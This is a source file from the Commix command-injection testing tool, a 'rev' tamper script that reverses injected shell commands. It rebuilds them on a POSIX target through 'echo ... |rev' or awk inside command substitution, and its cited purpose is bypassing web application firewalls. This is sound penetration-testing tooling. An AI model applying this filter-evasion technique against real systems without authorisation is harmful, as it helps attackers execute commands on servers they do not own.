#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings
from src.core.controller import checks

"""
About: Reverses (characterwise) the user-supplied operating system commands in a given payload.
Notes: This tamper script works against target(s) with a POSIX shell. The command is read back
       from its end by 'rev' where the separator under test is a pipe, and by 'awk' - which takes
       the words as arguments instead - where it is a ';' or a newline, those being what awk puts
       between its own statements. On any other separator neither form can be written without
       smuggling an operator the payload is not proving, and the script is left out of it.
References: [1] https://github.com/commixproject/commix/issues/408
            [2] https://medium.com/picus-security/how-to-bypass-wafs-for-os-command-injection-2c5dd4e6a52b
"""

__tamper__ = "rev"
__priority__ = settings.PRIORITY.HIGHER

# Why this script cannot be applied to the target at hand, or nothing where it can.
def dependencies():
  return checks.tamper_dep_unix_only(__tamper__)

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

# Hand the command over reversed, for the target to read back from its end.
def tamper(payload):
  # A target settled as Windows after this script was accepted: 'cmd.exe' has no command substitution to reverse the command back through.
  if settings.TARGET_OS == settings.OS.WINDOWS:
    return payload
  # An empty 'USER_APPLIED_CMD' is still "in" any string, so the replace below would otherwise
  # insert the reversed-empty-string construct between every character of the payload - a
  # verification litmus built after a finding confirms (and so after exploitation phase starts)
  # has no command of its own to reverse at all.
  if settings.EXPLOITATION_PHASE and settings.USER_APPLIED_CMD:
    source = payload if settings.USER_APPLIED_CMD in payload else settings.RAW_PAYLOAD
    if settings.USER_APPLIED_CMD in source:
      # 'rev' reads its input through a pipe and awk reads its own program through a ';' or a
      # newline, so the form handed over is the one whose operator is the separator under test.
      separator = checks.current_separator()
      if separator == settings.PIPE_SEPARATOR:
        reversed_cmd = "echo" + settings.SINGLE_WHITESPACE + settings.USER_APPLIED_CMD[::-1] + "|rev"
      elif checks.awk_separator_usable(separator):
        reversed_cmd = "awk" + settings.SINGLE_WHITESPACE + checks.awk_reverse_program(separator) + settings.SINGLE_WHITESPACE + settings.USER_APPLIED_CMD[::-1]
      else:
        warn_msg = "Nothing reads a command back from its end without an operator of its own, and "
        warn_msg += "none of the ones that do is the separator under test. Skipping tamper script."
        settings.print_once(warn_msg)
        return payload
      if settings.USE_BACKTICKS:
        rev_cmd = "\\`" + reversed_cmd + "\\`"
      else:
        rev_cmd = settings.CMD_SUB_PREFIX + reversed_cmd + settings.CMD_SUB_SUFFIX
      # Applied to the payload as handed over, not to the untouched original: the scripts run in
      # order, and reaching back past the ones before would throw their work away.
      payload = source.replace(settings.USER_APPLIED_CMD, rev_cmd)
      if len(settings.WHITESPACES) != 0:
        payload = payload.replace(settings.SINGLE_WHITESPACE, settings.WHITESPACES[0])
  return payload

# eof
